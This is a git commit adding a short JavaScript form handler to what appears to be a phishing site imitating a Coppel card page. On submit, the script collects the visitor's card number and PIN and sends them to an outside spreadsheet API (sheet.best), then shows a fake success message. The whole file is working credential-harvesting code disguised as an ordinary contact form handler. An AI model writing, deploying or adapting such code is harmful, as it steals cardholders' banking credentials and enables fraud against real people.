d4129010051a473ce97a18901077adebdea98685
soporte-j22 <robledofrancis4@gmail.com>
2026-06-22 13:28:11 -0600

    add

---
+++ tarjeta-coppel/js2/0822.js
@@ -0,0 +1,30 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/4831d40e-750e-4da8-a96f-bdc7c7bf5059', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Tarjeta": formulario.data1.value,
+            "Nip": formulario.data3.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
